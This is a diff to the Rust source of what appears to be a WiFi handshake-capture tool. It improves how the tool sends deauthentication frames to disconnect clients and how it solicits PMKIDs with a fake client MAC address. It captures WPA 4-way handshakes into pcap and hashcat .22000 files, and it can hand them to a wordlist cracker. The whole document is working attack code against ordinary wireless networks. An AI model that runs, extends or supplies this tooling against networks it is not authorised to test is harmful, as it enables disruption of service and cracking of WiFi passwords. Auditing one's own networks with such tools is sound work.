@@ -38,6 +38,8 @@ pub struct HandshakeOpts {
 const SUPPRESS_PROGRESS: Duration = Duration::from_secs(6);
 const SUPPRESS_MSGS: usize = 3;
 const WEAK_RSSI: i8 = -80;
+const LISTEN_AFTER_DEAUTH: Duration = Duration::from_secs(4);
+const STATUS_POLL: Duration = Duration::from_secs(2);
 // Locally-administered fake client MAC for clientless PMKID solicitation.
 const FAKE_CLIENT: [u8; 6] = [0x02, 0x1a, 0x2b, 0x3c, 0x4d, 0x5e];
 const M_NAMES: [&str; 4] = ["M1", "M2", "M3", "M4"];
@@ -58,6 +60,7 @@ pub fn run(dev: &mut Device, opts: &HandshakeOpts, oui_db: Option<&str>) -> Resu
     if targets.is_empty() {
         anyhow::bail!("no matching networks");
     }
+    let _ = dev.stop_current_task();
     install_sigint();
     let total = targets.len();
     let mut got = 0usize;
@@ -91,15 +94,20 @@ fn capture_one(
     let stop_on_crackable = total > 1 || !opts.continuous;
 
     let mut hs = Handshake::new(bssid, &target.ssid, channel);
-    dev.wifi_monitor_start(channel, &MonitorFilter::eapol(), None)?;
-    dev.set_read_timeout(Duration::from_millis(300))?;
+    dev.wifi_monitor_start(channel, &MonitorFilter::eapol_for(bssid), None)?;
+    dev.set_read_timeout(Duration::from_millis(200))?;
 
     let mut status = ui::StatusBlock::new();
     let start = Instant::now();
     let (mut last_draw, mut last_progress) = (start, start);
     let (mut next_solicit, mut solicits) = (start, 0u32);
-    let mut next_deauth = start + Duration::from_millis(opts.deauth_interval_ms);
+    let mut next_deauth = start + Duration::from_millis(500);
     let mut deauths = 0u64;
+    let mut mon_dropped = 0u64;
+    let mut mon_rx_kept = 0u64;
+    let mut drop_base = 0u64;
+    let mut next_status = start + STATUS_POLL;
+    let mut listen_until = start;
 
     let outcome: Result<()> = (|| {
         loop {
@@ -126,8 +134,10 @@ fn capture_one(
                 let now = Instant::now();
                 if !opts.no_pmkid
                     && hs.pmkid.is_none()
+                    && hs.msgs.iter().all(|m| m.is_none())
                     && solicits < opts.solicit_count
                     && now >= next_solicit
+                    && now >= listen_until
                 {
                     dev.wifi_raw_tx(
                         &ieee80211::auth_open(bssid, FAKE_CLIENT).to_bytes(),
@@ -144,20 +154,39 @@ fn capture_one(
                     next_solicit = now + Duration::from_millis(opts.solicit_interval_ms);
                 }
                 if !opts.pmkid_only && now >= next_deauth {
-                    // Don't kick a client mid-4-way or once nearly done.
                     let msgs = hs.msgs.iter().filter(|m| m.is_some()).count();
                     if msgs < SUPPRESS_MSGS && last_progress.elapsed() >= SUPPRESS_PROGRESS {
                         let sta = client_override
                             .or(hs.station)
                             .unwrap_or(ieee80211::BROADCAST);
                         let frame = ieee80211::deauth(bssid, sta, opts.reason).to_bytes();
-                        for _ in 0..opts.deauth_count {
-                            dev.wifi_raw_tx(&frame, channel)?;
-                            deauths += 1;
+                        let n = opts.deauth_count;
+                        for _ in 0..n {
+                            if dev.wifi_raw_tx(&frame, channel)? {
+                                deauths += 1;
+                            }
                         }
+                        listen_until = now + LISTEN_AFTER_DEAUTH;
+                        next_deauth = listen_until
+                            .max(now + Duration::from_millis(opts.deauth_interval_ms.max(1)));
+                    } else {
+                        next_deauth = now + Duration::from_millis(opts.deauth_interval_ms.max(1));
                     }
-                    next_deauth = now + Duration::from_millis(opts.deauth_interval_ms.max(1));
                 }
+            }
+            if Instant::now() >= next_status {
+                if let Ok(v) = dev.system_status() {
+                    if let Some(m) = v.get("monitor") {
+                        let dropped = m.get("dropped").and_then(|x| x.as_u64()).unwrap_or(0);
+                        let kept = m.get("rx_kept").and_then(|x| x.as_u64()).unwrap_or(0);
+                        if drop_base == 0 && mon_dropped == 0 && mon_rx_kept == 0 {
+                            drop_base = dropped;
+                        }
+                        mon_dropped = dropped.saturating_sub(drop_base);
+                        mon_rx_kept = kept;
+                    }
+                }
+                next_status = Instant::now() + STATUS_POLL;
             }
             if last_draw.elapsed() >= Duration::from_millis(200) {
                 let title = format!("handshake [{index}/{total}]");
@@ -168,6 +197,8 @@ fn capture_one(
                     channel,
                     solicits,
                     deauths,
+                    mon_dropped,
+                    mon_rx_kept,
                     start.elapsed(),
                 ));
                 last_draw = Instant::now();
@@ -216,7 +247,7 @@ fn write_output(
         return Ok(());
     }
     let pcap_path = format!("{out_base}.pcap");
-    let mut f = std::io::BufWriter::new(std::fs::File::create(&pcap_path)?);
+    let mut f = std::io::BufWriter::new(ui::create_secure(&pcap_path)?);
     hs.to_pcap(&mut f)?;
     f.flush()?;
     println!(
@@ -233,7 +264,7 @@ fn write_output(
             println!("  partial handshake; .22000 not written");
         } else {
             let hc = format!("{out_base}.22000");
-            std::fs::write(&hc, format!("{}\n", lines.join("\n")))?;
+            ui::create_secure(&hc)?.write_all(format!("{}\n", lines.join("\n")).as_bytes())?;
             println!("  wrote {hc} ({} line(s))", lines.len());
             if opts.crack {
                 crack::run(&hc, opts.wordlist.as_deref());
@@ -259,6 +290,8 @@ fn status_lines(
     channel: u8,
     solicits: u32,
     deauths: u64,
+    mon_dropped: u64,
+    mon_rx_kept: u64,
     elapsed: Duration,
 ) -> Vec<String> {
     let marks: Vec<&str> = (0..4)
@@ -283,13 +316,23 @@ fn status_lines(
             if hs.pmkid.is_some() { "yes" } else { "no" }
         ),
         format!("tx       {solicits} solicit   {deauths} deauth"),
+        format!("monitor  kept {mon_rx_kept}  dropped {mon_dropped}"),
     ];
-    let warning = (hs.ap_rssi != 0 && hs.ap_rssi < WEAK_RSSI)
+    let mut warning = (hs.ap_rssi != 0 && hs.ap_rssi < WEAK_RSSI)
         .then(|| format!("weak signal ({} dBm) - move closer", hs.ap_rssi));
+    if mon_dropped > 0 {
+        let drop = format!(
+            "device ring dropped {mon_dropped} frame(s). Move closer or quieter channel"
+        );
+        warning = Some(match warning {
+            Some(w) => format!("{w}; {drop}"),
+            None => drop,
+        });
+    }
     ui::status_frame(title, elapsed, &body, warning.as_deref())
 }
 
-fn sanitize(s: &str) -> String {
+pub(crate) fn sanitize(s: &str) -> String {
     s.chars()
         .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
         .collect()
